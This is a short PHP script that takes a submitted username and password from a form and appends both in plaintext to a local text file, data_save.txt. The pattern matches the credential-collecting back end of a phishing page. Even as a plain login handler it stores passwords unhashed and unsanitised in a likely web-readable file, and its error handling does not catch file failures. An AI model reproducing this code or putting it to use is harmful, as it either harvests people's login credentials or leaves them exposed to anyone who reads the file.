<?php
// Retrieve form data
$username = $_POST['username'];
$password = $_POST['password'];

// Save data to a local file named data_save.txt
try {
    // Open the file in append mode
    $file = fopen("data_save.txt", "a");

    // Append username and password to the file
    fwrite($file, "Username: $username, Password: $password\n");

    // Close the file
    fclose($file);

    // Send success response
    echo "Data saved successfully.";
} catch (Exception $e) {
    // Handle file writing error
    echo "Error: " . $e->getMessage();
}
?>
